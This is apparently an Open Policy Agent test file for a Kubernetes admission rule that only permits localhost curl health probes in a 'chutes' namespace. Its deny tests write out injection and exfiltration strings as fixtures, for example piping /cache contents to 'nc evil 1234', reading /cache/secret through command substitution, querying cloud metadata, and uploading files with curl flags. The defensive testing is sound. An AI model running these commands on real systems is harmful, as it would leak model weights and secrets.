# Probe exec must be a plain localhost curl. It cannot be blocked outright — the chute only accepts
# unauthenticated requests from 127.0.0.1, so the probe has to run inside the pod.
package kubernetes.admission

import future.keywords.if
import future.keywords.in

sh(script) := ["/bin/sh", "-c", script]

probe_pod(container_extra) := {
	"operation": "CREATE",
	"namespace": "chutes",
	"kind": {"kind": "Pod"},
	"userInfo": {"username": "system:serviceaccount:chutes:miner"},
	"object": {
		"metadata": {"labels": {"chutes/chute": "true"}},
		"spec": {
			"securityContext": {"runAsUser": 1000},
			"containers": [object.union(
				{"name": "chute", "image": "registry.chutes.ai/org/chute:latest", "command": ["chutes", "run", "x"]},
				container_extra,
			)],
		},
	},
}

probe_denied := sprintf(
	"Chutes namespace: container '%s' probe exec must be a plain localhost curl (/bin/sh -c 'curl -f http://127.0.0.1:<port>/<path> || exit 1')",
	["chute"],
)

readiness(script) := probe_pod({"readinessProbe": {"exec": {"command": sh(script)}}})

# --- the production probe, and the flexibility that was asked for ----------------

test_allow_the_real_readiness_probe if {
	not deny[probe_denied] with input as {"request": readiness("curl -f http://127.0.0.1:8000/_alive || exit 1")}
}

test_allow_a_different_port_and_path if {
	every script in {
		"curl -f http://127.0.0.1:31337/healthz || exit 1",
		"curl -f http://127.0.0.1:8080/v1/health/ready || exit 1",
		"curl -f http://127.0.0.1:8000/_alive",
		"curl -sf http://127.0.0.1:8000/_alive || exit 1",
		"curl --fail --silent http://127.0.0.1:8000/_alive || exit 1",
		"curl -f -m 2 http://127.0.0.1:8000/_alive || exit 1",
	} {
		not deny[probe_denied] with input as {"request": readiness(script)}
	}
}

# --- shell injection: the reason the regex is anchored --------------------------

test_deny_shell_injection_after_a_valid_curl if {
	every script in {
		"curl -f http://127.0.0.1:8000/_alive; tar czf - /cache | nc evil 1234",
		"curl -f http://127.0.0.1:8000/_alive && cat /cache/weights",
		"curl -f http://127.0.0.1:8000/_alive || nc evil 1234 < /cache/w",
		"curl -f http://127.0.0.1:8000/$(cat /cache/secret) || exit 1",
		"curl -f http://127.0.0.1:8000/`id` || exit 1",
		"curl -f http://127.0.0.1:8000/_alive\nexfil",
	} {
		deny[probe_denied] with input as {"request": readiness(script)}
	}
}

test_deny_non_localhost_target if {
	every script in {
		"curl -f http://evil.example/_alive || exit 1",
		"curl -f http://127.0.0.1.evil.example/_alive || exit 1",
		"curl -f https://127.0.0.1:8000/_alive || exit 1",
		"curl -f http://169.254.169.254/latest/meta-data || exit 1",
	} {
		deny[probe_denied] with input as {"request": readiness(script)}
	}
}

# Flags that read or write a file, or redirect the request elsewhere.
test_deny_file_and_redirect_flags if {
	every script in {
		"curl -o /cache/x http://127.0.0.1:8000/_alive || exit 1",
		"curl -T /cache/weights http://127.0.0.1:8000/_alive || exit 1",
		"curl -K /tmp/evil.conf http://127.0.0.1:8000/_alive || exit 1",
		"curl -d @/cache/weights http://127.0.0.1:8000/_alive || exit 1",
	} {
		deny[probe_denied] with input as {"request": readiness(script)}
	}
}

test_deny_a_command_that_is_not_sh_dash_c if {
	req := probe_pod({"readinessProbe": {"exec": {"command": ["/bin/bash", "-c", "curl -f http://127.0.0.1:8000/_alive"]}}})
	deny[probe_denied] with input as {"request": req}
	req2 := probe_pod({"readinessProbe": {"exec": {"command": ["curl", "-f", "http://127.0.0.1:8000/_alive"]}}})
	deny[probe_denied] with input as {"request": req2}
}

test_deny_extra_command_elements if {
	req := probe_pod({"readinessProbe": {"exec": {"command": ["/bin/sh", "-c", "curl -f http://127.0.0.1:8000/_alive", "; exfil"]}}})
	deny[probe_denied] with input as {"request": req}
}

# --- every probe kind is covered -------------------------------------------------

test_deny_bad_liveness_and_startup_probes if {
	req := probe_pod({"livenessProbe": {"exec": {"command": sh("nc evil 1234 < /cache/w")}}})
	deny[probe_denied] with input as {"request": req}
	req2 := probe_pod({"startupProbe": {"exec": {"command": sh("nc evil 1234 < /cache/w")}}})
	deny[probe_denied] with input as {"request": req2}
}

# --- non-exec probes are kubelet's own work and stay unconstrained ---------------

test_allow_http_get_and_tcp_socket_probes if {
	req := probe_pod({"readinessProbe": {"httpGet": {"path": "/_alive", "port": 8000}}})
	not deny[probe_denied] with input as {"request": req}
	req2 := probe_pod({"livenessProbe": {"tcpSocket": {"port": 8000}}})
	not deny[probe_denied] with input as {"request": req2}
}

test_allow_container_with_no_probe if {
	not deny[probe_denied] with input as {"request": probe_pod({})}
}
